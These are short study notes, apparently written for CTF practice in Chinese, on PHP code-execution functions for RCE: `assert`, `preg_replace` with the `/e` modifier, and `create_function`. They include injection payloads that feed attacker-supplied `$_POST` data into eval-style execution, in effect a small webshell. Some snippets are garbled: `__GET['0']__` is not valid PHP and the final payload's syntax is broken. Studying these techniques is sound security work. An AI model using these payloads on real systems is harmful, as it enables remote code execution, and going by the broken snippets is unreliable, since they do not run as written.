**我们的所有的命令执行，后面都需要加一个分号才可以取执行我们的对应的代码**。

## 代码执行函数：

代码执行函数主要应用在我们的无字母，无数字 RCE 中，也就是我们不是直接输入一条指令，而是输入指令后等待我们的元素处理一遍后，我们再去执行处理后的结果的指令。

1. Assert 执行：
在我们的版本较低的情况下，我们可以采用我们的 `assert` 函数，来执行我们的对应的函数。例如：我们 `assert(phpinfo())`

2. preg_replace 执行：
```
preg_replace("/abcd/e",$_POST['hacker'],"abcdefg");
```

3. Create_function 函数
我们在下面的方法的时候, 我们如果给我们的变量 a 赋值为一个传统的 php 自带的函数，是不可能完成的，这个时候，我们就需要使用我们的 php 中的创建函数的功能，创造函数的语法如下所示：
```
$a=__GET['0']__;
$a('',$this->code);
```
![[Pasted image 20240422144321.png]]
```
<?php
$newfun = create_function('', 'phpinfo()');
eval($newfun());
?>
```

这个时候，如果让我们的 `$a` 是 `create_function` 函数，那么我们就可以实现我们的**任意**远程函数执行，我们 create_function 语法如下：
```
$f=create_function('$a,$b',$code);
//其中，我们的a和b是参数
```

其中我们的 code 表示我们希望执行的代码内容。

但是，我们这一种方法存在漏洞，我们可以让我们的 `$code` 是下面的内容
```php
"return (0);eval($_POST ['19268017'],echo 0)";
```

